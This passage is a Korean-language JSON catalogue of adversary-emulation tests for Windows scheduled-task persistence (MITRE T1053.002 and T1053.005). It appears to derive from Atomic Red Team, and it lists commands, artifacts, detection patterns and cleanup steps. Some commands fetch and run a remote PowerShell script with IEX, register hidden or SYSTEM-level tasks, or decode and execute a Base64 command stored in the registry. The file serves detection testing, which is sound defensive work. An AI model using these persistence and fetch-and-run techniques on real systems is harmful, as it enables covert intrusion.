      "test_id": "T1053.002-1",
      "name": "At.exe Scheduled task",
      "platforms": ["windows"],

      "summary": "at.exe를 사용해 13:20에 상호작용형(interactive) cmd.exe를 실행하도록 예약 작업을 생성하는 시나리오이다. 실행 시 cmd.exe가 at.exe를 호출해 작업을 등록하고, 지정된 시간에 새 cmd 창이 자동으로 열리게 된다.",

      "procedure": [
        "명령 프롬프트(cmd.exe)를 연다.",
        "at 13:20 /interactive cmd 명령을 실행해 13:20에 cmd.exe를 인터랙티브 세션으로 실행하는 작업을 예약한다.",
        "at 명령만 입력해 예약된 작업 목록을 확인하고, 방금 생성된 작업이 등록되었는지 확인한다.",
        "시스템 시간이 13:20이 되면 예약된 작업이 실행되면서 새로운 cmd.exe 프로세스가 생성되는지 관찰한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "at 13:20 /interactive cmd"
        }
      ],

      "prerequisites": [
        "테스트 대상 시스템에 at.exe(레거시 작업 스케줄러 인터페이스)가 존재해야 한다. Windows 8 이상 버전에서는 기본적으로 deprecated 상태일 수 있다.",
        "지정한 시간(예: 13:20) 이전에 명령을 실행해야 예약 작업이 실제로 트리거된다.",
        "일부 환경에서는 at 명령 사용에 대해 관리자 권한 또는 서비스 설정이 요구될 수 있다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "C:\\Windows\\Tasks\\At*.job",
            "description": "at.exe에 의해 생성되는 레거시 AT 작업 파일(운영체제/설정에 따라 실제 경로나 존재 여부는 다를 수 있음)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "사용자가 at 명령을 실행하는 콘솔 프로세스",
            "commandline_pattern": "cmd.exe /c at 13:20 /interactive cmd"
          },
          {
            "name": "at.exe",
            "description": "예약 작업 생성을 담당하는 레거시 스케줄링 유틸리티",
            "commandline_pattern": "at 13:20 /interactive cmd"
          },
          {
            "name": "cmd.exe",
            "description": "지정된 시각에 예약 작업에 의해 새로 실행되는 명령 프롬프트 세션",
            "commandline_pattern": "cmd.exe"
          }
        ],
        "network": []
      },

      "cleanup": [
        "at 명령만 입력해 현재 예약된 작업 목록을 확인한 후, 생성된 작업 ID를 파악한다.",
        "at <job_id> /delete 명령 또는 at /delete /yes 명령을 사용해 테스트 중 생성된 예약 작업을 삭제한다.",
        "필요하다면 C:\\Windows\\Tasks\\At*.job 파일(해당되는 경우)을 수동으로 삭제해 파일 흔적을 제거할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "4a6c0dc4-0f2a-4203-9298-a5a9bdc21ed8"
      }
    }
  ]
},
{
  "technique_id": "T1053.005",
  "technique_name": "Scheduled Task/Job: Scheduled Task",
  "tactic": "Execution",
  "description": "공격자는 Windows 작업 스케줄러(Scheduled Task)를 이용해 지정된 시점·이벤트에 악성 코드를 자동 실행하도록 설정한다. 이는 사용자 로그온, 부팅, 주기적 실행 등 다양한 트리거를 통해 지속성 확보와 지연 실행, 탐지 우회에 활용된다. schtasks.exe, PowerShell cmdlet, WMI, XML, 레지스트리 조작 등 여러 인터페이스가 악용될 수 있다.",

  "tests": [
    {
      "test_id": "T1053.005-1",
      "name": "Scheduled Task Startup Script",
      "platforms": ["windows"],

      "summary": "schtasks.exe를 이용해 사용자 로그온 시(calc.exe)와 시스템 시작 시(calc.exe)를 실행하는 두 개의 작업을 생성한다. 로그온/부팅 이벤트 기반 자동 실행 형태의 간단한 지속성 시나리오를 재현한다.",

      "procedure": [
        "관리자 권한 cmd.exe를 실행한다.",
        "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\" 명령으로 사용자 로그온 시 calc.exe를 실행하는 작업을 생성한다.",
        "schtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\" 명령으로 시스템 시작 시 SYSTEM 권한으로 calc.exe를 실행하는 작업을 생성한다.",
        "작업 스케줄러(Task Scheduler)를 열어 Active Tasks 창에서 T1053_005_OnLogon, T1053_005_OnStartup 작업이 등록되었는지 확인한다.",
        "로그오프/재부팅 등을 통해 조건이 만족되면 calc.exe가 자동 실행되는지 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\r\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\""
        }
      ],

      "prerequisites": [
        "명령 프롬프트를 관리자 권한으로 실행해야 한다.",
        "테스트 계정이 작업 스케줄러에서 작업 생성 권한을 가지고 있어야 한다.",
        "calc.exe 및 cmd.exe가 기본 경로에 존재해야 한다(기본 Windows 환경)."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\T1053_005_OnLogon",
            "description": "로그온 시 calc.exe를 실행하는 작업에 대한 TaskCache 항목"
          },
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\T1053_005_OnStartup",
            "description": "시스템 시작 시 calc.exe를 실행하는 작업에 대한 TaskCache 항목"
          }
        ],
        "processes": [
          {
            "name": "schtasks.exe",
            "description": "T1053_005_OnLogon 및 T1053_005_OnStartup 작업을 생성하는 유틸리티",
            "commandline_pattern": "schtasks /create /tn \"T1053_005_On*\" *"
          },
          {
            "name": "cmd.exe",
            "description": "작업의 /TR 인자로 사용되어 calc.exe를 실행하는 중간 프로세스",
            "commandline_pattern": "cmd.exe /c calc.exe"
          },
          {
            "name": "calc.exe",
            "description": "스케줄된 작업 트리거 시 실행되는 예제 페이로드",
            "commandline_pattern": "calc.exe"
          }
        ],
        "network": []
      },

      "cleanup": [
        "schtasks /delete /tn \"T1053_005_OnLogon\" /f 명령으로 로그온 작업을 삭제한다.",
        "schtasks /delete /tn \"T1053_005_OnStartup\" /f 명령으로 부팅 작업을 삭제한다.",
        "Task Scheduler에서 관련 작업이 더 이상 표시되지 않는지 확인한다."
      ],

      "metadata": {
        "atomic_source_id": "fec27f65-db86-4c2d-b66c-61945aee87c2"
      }
    },

    {
      "test_id": "T1053.005-2",
      "name": "Scheduled task Local",
      "platforms": ["windows"],

      "summary": "로컬 시스템에서 schtasks.exe를 사용해 지정된 시간(기본 20:10)에 cmd.exe를 한 번 실행하는 작업을 생성한다. ONCE 스케줄을 이용한 단발성 지연 실행 패턴을 보여준다.",

      "procedure": [
        "cmd.exe를 실행한다(기본 설정에서는 관리자 권한이 없어도 동작 가능).",
        "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time} 명령을 실행해 ONCE 타입 작업 spawn을 생성한다.",
        "schtasks /query /TN spawn 명령으로 작업이 제대로 등록되었는지 확인한다.",
        "시스템 시간이 #{time}에 도달하면 #{task_command}(기본: C:\\windows\\system32\\cmd.exe)가 실행되는지 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}"
        }
      ],

      "prerequisites": [
        "사용자가 로컬 시스템에서 작업을 생성할 수 있는 권한을 가지고 있어야 한다.",
        "#{task_command} 경로가 유효해야 한다(기본: C:\\windows\\system32\\cmd.exe).",
        "#{time} 값은 유효한 24시간 형식(HH:MM)이어야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\spawn",
            "description": "spawn라는 이름의 단발성 스케줄 작업에 대한 TaskCache 레지스트리 항목"
          }
        ],
        "processes": [
          {
            "name": "schtasks.exe",
            "description": "spawn 작업을 생성하는 유틸리티",
            "commandline_pattern": "SCHTASKS /Create /SC ONCE /TN spawn /TR * /ST *"
          },
          {
            "name": "cmd.exe",
            "description": "스케줄된 시각에 실행되는 기본 페이로드 프로세스",
            "commandline_pattern": "C:\\windows\\system32\\cmd.exe"
          }
        ],
        "network": []
      },

      "cleanup": [
        "SCHTASKS /Delete /TN spawn /F 명령으로 spawn 작업을 삭제한다.",
        "Task Scheduler 및 TaskCache 레지스트리에서 해당 항목이 제거되었는지 확인한다."
      ],

      "metadata": {
        "atomic_source_id": "42f53695-ad4a-4546-abb6-7d837f644a71"
      }
    },

    {
      "test_id": "T1053.005-3",
      "name": "Scheduled task Remote",
      "platforms": ["windows"],

      "summary": "SCHTASKS를 사용해 원격 시스템에 \"Atomic task\"라는 이름의 일일(Daily) 작업을 생성하고, 특정 시간(기본 20:10)에 cmd.exe를 실행하도록 설정한다. 도메인 자격 증명을 이용한 원격 작업 생성 시나리오이다.",

      "procedure": [
        "로컬 시스템에서 cmd.exe를 관리자 권한으로 실행한다.",
        "#{target} 호스트에 대해 #{user_name} / #{password} 자격 증명으로 원격 접속이 가능한지 확인한다.",
        "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time} 명령을 실행해 원격 시스템에 작업을 생성한다.",
        "SCHTASKS /Query /S #{target} /U #{user_name} /P #{password} /TN \"Atomic task\" 명령으로 원격 작업이 생성되었는지 확인한다.",
        "시간이 경과하거나 수동으로 schtasks /Run을 실행해 원격 시스템에서 #{task_command}가 실행되는지 확인할 수 있다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}"
        }
      ],

      "prerequisites": [
        "테스트 계정은 원격 컴퓨터 #{target}에 대한 적절한 권한을 가져야 하며, 원격 스케줄 작업 생성 권한이 있어야 한다.",
        "방화벽에서 원격 작업 스케줄러 및 RPC 관련 포트가 허용되어 있어야 한다.",
        "#{task_command} 경로는 원격 시스템 기준으로 유효해야 한다.",
        "SCHTASKS 명령을 실행하기 위해 관리자 권한 cmd.exe가 필요하다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "\\\\#{target}\\HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Atomic task",
            "description": "원격 시스템에 생성된 \"Atomic task\" 스케줄 작업의 TaskCache 항목"
          }
        ],
        "processes": [
          {
            "name": "schtasks.exe",
            "description": "원격 시스템 #{target}에 스케줄 작업을 생성하는 로컬 프로세스",
            "commandline_pattern": "SCHTASKS /Create /S #{target} /RU * /RP * /TN \"Atomic task\" *"
          }
        ],
        "network": [
          {
            "protocol": "RPC/SMB",
            "description": "SCHTASKS가 원격 시스템 #{target}과 통신할 때 사용되는 관리 트래픽",
            "destination_pattern": "#{target}"
          }
        ]
      },

      "cleanup": [
        "SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN \"Atomic task\" /F 명령으로 원격 작업을 삭제한다.",
        "원격 시스템의 Task Scheduler에서 작업이 제거되었는지 확인한다."
      ],

      "metadata": {
        "atomic_source_id": "2e5eac3e-327b-4a88-a0c0-c4057039a8dd"
      }
    },

    {
      "test_id": "T1053.005-4",
      "name": "Powershell Cmdlet Scheduled Task",
      "platforms": ["windows"],

      "summary": "PowerShell의 작업 스케줄러 cmdlet(New-ScheduledTaskAction 등)을 사용해 Administrators 그룹 컨텍스트로 calc.exe를 로그온 시 실행하는 AtomicTask를 생성한다. schtasks.exe 대신 네이티브 PowerShell API를 사용하는 패턴이다.",

      "procedure": [
        "PowerShell 콘솔을 실행한다.",
        "New-ScheduledTaskAction -Execute \"calc.exe\" 명령으로 calc.exe 실행 액션을 생성한다.",
        "New-ScheduledTaskTrigger -AtLogon 명령으로 사용자 로그온 시 트리거를 생성한다.",
        "New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest 명령으로 최고 권한(관리자 그룹)으로 실행되는 Principal을 생성한다.",
        "New-ScheduledTaskSettingsSet으로 기본 설정 세트를 생성하고, New-ScheduledTask로 Action/Trigger/Principal/Settings를 조합한 객체를 만든다.",
        "Register-ScheduledTask AtomicTask -InputObject $object 명령으로 AtomicTask라는 이름의 작업을 등록한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\r\n$Trigger = New-ScheduledTaskTrigger -AtLogon\r\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\r\n$Set = New-ScheduledTaskSettingsSet\r\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\r\nRegister-ScheduledTask AtomicTask -InputObject $object"
        }
      ],

      "prerequisites": [
        "PowerShell 작업 스케줄러 cmdlet(New-ScheduledTask*, Register-ScheduledTask 등)을 지원하는 Windows 버전이어야 한다.",
        "Administrators 그룹 컨텍스트로 실행하기 위해 적절한 권한이 필요하다(일반적으로 관리자 권한 PowerShell).",
        "calc.exe가 기본 경로에 존재해야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\AtomicTask",
            "description": "PowerShell cmdlet로 생성된 AtomicTask 스케줄 작업의 TaskCache 항목"
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "New-ScheduledTaskAction/Trigger/Principal/Settings, Register-ScheduledTask를 호출해 작업을 생성하는 프로세스",
            "commandline_pattern": "powershell.exe *New-ScheduledTaskAction*Register-ScheduledTask AtomicTask*"
          },
          {
            "name": "calc.exe",
            "description": "사용자 로그온 시 AtomicTask에 의해 실행되는 페이로드",
            "commandline_pattern": "calc.exe"
          }
        ],
        "network": []
      },

      "cleanup": [
        "Unregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false 명령으로 작업을 제거한다.",
        "Task Scheduler GUI와 레지스트리 TaskCache에서 AtomicTask가 제거되었는지 확인한다."
      ],

      "metadata": {
        "atomic_source_id": "af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd"
      }
    },

    {
      "test_id": "T1053.005-5",
      "name": "Task Scheduler via VBA (Maldoc)",
      "platforms": ["windows"],

      "summary": "Invoke-MalDoc PowerShell 스크립트를 사용해 악성 매크로 코드가 포함된 Office 문서를 열고, VBA를 통해 notepad.exe를 30~40초 후 실행하는 스케줄 작업을 등록하는 시나리오이다. 문서 기반 초기 침투 후 Task Scheduler를 악용하는 패턴을 재현한다.",

      "procedure": [
        "PowerShell에서 Microsoft #{ms_product} (기본: Word)가 COM 객체로 생성 가능한지 확인해 설치 여부를 검증한다.",
        "[Net.ServicePointManager]::SecurityProtocol = Tls12 설정 후, Invoke-MalDoc.ps1을 GitHub에서 다운로드 및 로드(IEX (iwr ...))한다.",
        "Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\" 명령을 실행해 지정 매크로를 포함한 Office 문서를 실행한다.",
        "매크로 코드는 Windows API/Task Scheduler 인터페이스를 호출해 약 30~40초 후 notepad.exe를 실행하는 작업을 등록한다.",
        "지정된 시간이 지난 후 notepad.exe가 자동 실행되는지 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\""
        }
      ],

      "prerequisites": [
        "Microsoft #{ms_product}(기본: Word)가 시스템에 설치되어 있어야 하며, COM 객체로 생성 가능해야 한다.",
        "인터넷 연결이 가능해 GitHub에서 Invoke-MalDoc.ps1을 다운로드할 수 있어야 한다.",
        "매크로 실행이 보안 정책에 의해 차단되지 않거나, 적절히 허용되어야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt",
            "description": "스케줄 작업 생성을 수행하는 매크로 코드가 포함된 텍스트 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Invoke-MalDoc를 통해 악성 매크로 문서를 실행하고 Task Scheduler를 트리거하는 프로세스",
            "commandline_pattern": "powershell.exe *Invoke-MalDoc*Scheduler*"
          },
          {
            "name": "winword.exe",
            "description": "Word를 사용할 경우 매크로 문서를 여는 프로세스(제품에 따라 프로세스명은 다를 수 있음)",
            "commandline_pattern": "winword.exe *"
          },
          {
            "name": "notepad.exe",
            "description": "스케줄된 작업에 의해 약 30~40초 후 실행되는 페이로드",
            "commandline_pattern": "notepad.exe"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "Invoke-MalDoc.ps1을 다운로드하기 위한 GitHub 접근 트래픽",
            "destination_pattern": "raw.githubusercontent.com/redcanaryco/atomic-red-team/*/Invoke-MalDoc.ps1"
          }
        ]
      },

      "cleanup": [
        "Unregister-ScheduledTask -TaskName \"Run Notepad\" -Confirm:$false 명령으로 생성된 작업을 삭제한다.",
        "테스트용으로 내려받은 Invoke-MalDoc.ps1 및 관련 매크로 파일을 삭제해 흔적을 최소화할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "ecd3fa21-7792-41a2-8726-2c5c673414d3"
      }
    },

    {
      "test_id": "T1053.005-6",
      "name": "WMI Invoke-CimMethod Scheduled Task",
      "platforms": ["windows"],

      "summary": "WMI 클래스 PS_ScheduledTask와 Invoke-CimMethod RegisterByXml 메서드를 이용해 XML 정의(T1053_005_WMI.xml)에 기반한 작업을 등록한다. PowerShell cmdlet 대신 WMI 경로를 악용하는 스케줄 작업 생성 기법이다.",

      "procedure": [
        "#{xml_path}에 T1053_005_WMI.xml 파일이 존재하는지 확인한다. 없으면 Invoke-WebRequest로 GitHub에서 다운로드한다.",
        "PowerShell을 관리자 권한으로 실행한다.",
        "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\") 명령을 통해 XML 내용을 문자열로 읽어온다.",
        "Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; } 명령을 실행해 XML 기반 작업을 등록한다.",
        "Task Scheduler에서 \"T1053_005_WMI\" 작업이 생성되었는지 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\r\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }"
        }
      ],

      "prerequisites": [
        "#{xml_path} 위치에 T1053_005_WMI.xml이 존재해야 한다(없으면 get_prereq 단계에서 다운로드).",
        "관리자 권한 PowerShell이 필요하며, WMI 네임스페이스 Root\\Microsoft\\Windows\\TaskScheduler에 접근할 수 있어야 한다.",
        "Task Scheduler 서비스가 정상 동작 중이어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "#{xml_path}",
            "description": "GitHub에서 다운로드한 스케줄 작업 정의 XML 파일"
          }
        ],
        "files_read": [
          {
            "path": "#{xml_path}",
            "description": "RegisterByXml에 전달되는 원본 XML 정의"
          }
        ],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\T1053_005_WMI",
            "description": "WMI를 통해 생성된 T1053_005_WMI 작업에 대한 TaskCache 항목"
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Invoke-CimMethod를 통해 WMI 기반 스케줄 작업을 등록하는 프로세스",
            "commandline_pattern": "powershell.exe *Invoke-CimMethod*PS_ScheduledTask*RegisterByXml*"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "get_prereq 단계에서 T1053_005_WMI.xml을 다운로드하는 트래픽",
            "destination_pattern": "github.com/redcanaryco/atomic-red-team/*/T1053_005_WMI.xml"
          }
        ]
      },

      "cleanup": [
        "Unregister-ScheduledTask -TaskName \"T1053_005_WMI\" -confirm:$false 명령으로 작업을 제거한다.",
        "테스트 후 XML 파일을 삭제해 로컬 디스크 흔적을 줄일 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b"
      }
    },

    {
      "test_id": "T1053.005-7",
      "name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
      "platforms": ["windows"],

      "summary": "HKCU\\SOFTWARE\\ATOMIC-T1053.005 레지스트리에 Base64 인코딩된 명령(ping 127.0.0.1)을 저장하고, 매일 지정된 시간에 이 값을 디코딩해 PowerShell로 실행하는 스케줄 작업을 생성한다. QakBot에서 관찰된 레지스트리+스케줄 작업 기반 지속성 패턴을 모방한다.",

      "procedure": [
        "cmd.exe를 관리자 권한으로 실행한다(레지스트리 및 작업 생성 권한 확보 목적).",
        "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f 명령을 실행해 ping 127.0.0.1에 해당하는 Base64 문자열을 test 값으로 저장한다.",
        "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time} 명령을 실행해 매일 #{time}에 레지스트리 값을 디코딩·실행하는 작업을 생성한다.",
        "Task Scheduler GUI 또는 schtasks /query /TN \"ATOMIC-T1053.005\"로 작업이 등록되었는지 확인한다.",
        "실행 시점 이후에는 네트워크에서 ping 127.0.0.1 호출이 발생하는지 관찰할 수 있다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\r\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}"
        }
      ],

      "prerequisites": [
        "HKCU 레지스트리를 수정할 수 있는 현재 사용자 권한이 필요하다.",
        "powershell.exe, cmd.exe가 기본 경로에 존재해야 한다.",
        "Task Scheduler가 활성화되어 있어야 하며, 작업 생성이 허용되어야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKCU\\SOFTWARE\\ATOMIC-T1053.005",
            "description": "Base64 인코딩된 명령 문자열이 저장된 사용자 영역 레지스트리 키"
          },
          {
            "path": "HKCU\\SOFTWARE\\ATOMIC-T1053.005\\test",
            "description": "ping 127.0.0.1에 해당하는 Base64 문자열 값(cGluZyAxMjcuMC4wLjE=)"
          }
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "HKCU\\SOFTWARE\\ATOMIC-T1053.005 키에 test 값을 추가하는 레지스트리 편집 도구",
            "commandline_pattern": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test *"
          },
          {
            "name": "schtasks.exe",
            "description": "ATOMIC-T1053.005라는 이름의 작업을 생성하는 유틸리티",
            "commandline_pattern": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" *"
          },
          {
            "name": "powershell.exe",
            "description": "스케줄된 시각에 Base64 문자열을 디코딩해 명령을 실행하는 프로세스",
            "commandline_pattern": "powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(*ATOMIC-T1053.005*)))"
          }
        ],
        "network": [
          {
            "protocol": "ICMP",
            "description": "디코딩된 명령이 실행되면 localhost(127.0.0.1)로 전송되는 ping 트래픽",
            "destination_pattern": "127.0.0.1"
          }
        ]
      },

      "cleanup": [
        "schtasks /delete /tn \"ATOMIC-T1053.005\" /F 명령으로 스케줄 작업을 삭제한다.",
        "reg delete HKCU\\SOFTWARE\\ATOMIC-T1053.005 /F 명령으로 사용자 레지스트리 키를 제거한다."
      ],

      "metadata": {
        "atomic_source_id": "e895677d-4f06-49ab-91b6-ae3742d0a2ba"
      }
    },

    {
      "test_id": "T1053.005-8",
      "name": "Import XML Schedule Task with Hidden Attribute",
      "platforms": ["windows"],

      "summary": "숨김(hidden) 속성을 가진 XML 정의를 WMI PS_ScheduledTask::RegisterByXml로 등록해 사용자 로그온 시 calc.exe를 실행하는 작업을 생성한다. 트릭봇, Industroyer2 등에서 사용된 숨김 스케줄 작업 기반 지속성을 재현한다.",

      "procedure": [
        "#{xml_path}에 T1053_05_SCTASK_HIDDEN_ATTRIB.xml 파일이 존재하는지 확인하고, 없으면 GitHub에서 다운로드한다.",
        "관리자 권한 PowerShell을 실행한다.",
        "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\") 명령으로 XML 내용을 불러온다.",
        "Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; } 명령을 실행해 숨김 속성 작업을 등록한다.",
        "Task Scheduler에서 \"atomic red team\" 작업을 확인하되, Hidden 속성으로 인해 기본 뷰에 잘 보이지 않을 수 있음을 감안한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\r\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }"
        }
      ],

      "prerequisites": [
        "#{xml_path} 위치에 숨김 속성이 포함된 XML 파일이 존재해야 한다(없을 경우 get_prereq에서 다운로드).",
        "관리자 권한 PowerShell이 필요하며, WMI 네임스페이스 Root\\Microsoft\\Windows\\TaskScheduler에 접근할 수 있어야 한다.",
        "calc.exe가 시스템에 존재해야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "#{xml_path}",
            "description": "숨김 속성 스케줄 작업 정의가 포함된 XML 파일"
          }
        ],
        "files_read": [
          {
            "path": "#{xml_path}",
            "description": "RegisterByXml 호출 시 읽어 들이는 XML 정의"
          }
        ],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\atomic red team",
            "description": "숨김 속성이 설정된 스케줄 작업(atomic red team)에 대한 TaskCache 항목"
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "숨김 속성 XML을 이용해 RegisterByXml 메서드로 작업을 등록하는 프로세스",
            "commandline_pattern": "powershell.exe *RegisterByXml*atomic red team*"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "T1053_05_SCTASK_HIDDEN_ATTRIB.xml을 다운로드하기 위한 GitHub 통신",
            "destination_pattern": "github.com/redcanaryco/atomic-red-team/*/T1053_05_SCTASK_HIDDEN_ATTRIB.xml"
          }
        ]
      },

      "cleanup": [
        "Unregister-ScheduledTask -TaskName \"atomic red team\" -confirm:$false 명령으로 작업을 제거한다.",
        "테스트용 XML 파일이 더 이상 필요 없다면 삭제한다."
      ],

      "metadata": {
        "atomic_source_id": "cd925593-fbb4-486d-8def-16cbdf944bf4"
      }
    },

    {
      "test_id": "T1053.005-9",
      "name": "PowerShell Modify A Scheduled Task",
      "platforms": ["windows"],

      "summary": "PowerShell cmdlet을 이용해 처음에는 cmd.exe를 실행하도록 등록된 AtomicTaskModifed 작업을 만든 뒤, Set-ScheduledTask를 통해 액션을 notepad.exe 실행으로 변경한다. 기존 작업의 Action 수정에 따른 로그/아티팩트 변화를 관찰할 수 있다.",

      "procedure": [
        "PowerShell 콘솔을 실행한다.",
        "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\" 명령으로 초기 액션을 생성한다.",
        "New-ScheduledTaskTrigger -AtLogon, New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest, New-ScheduledTaskSettingsSet로 트리거/프린시펄/설정 객체를 생성한다.",
        "New-ScheduledTask로 위 요소를 조합해 작업 객체를 만들고, Register-ScheduledTask AtomicTaskModifed -InputObject $object 명령으로 작업을 등록한다.",
        "$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\" 명령으로 새로운 액션을 정의한다.",
        "Set-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction 명령을 실행해 기존 작업의 액션을 notepad.exe 실행으로 변경한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
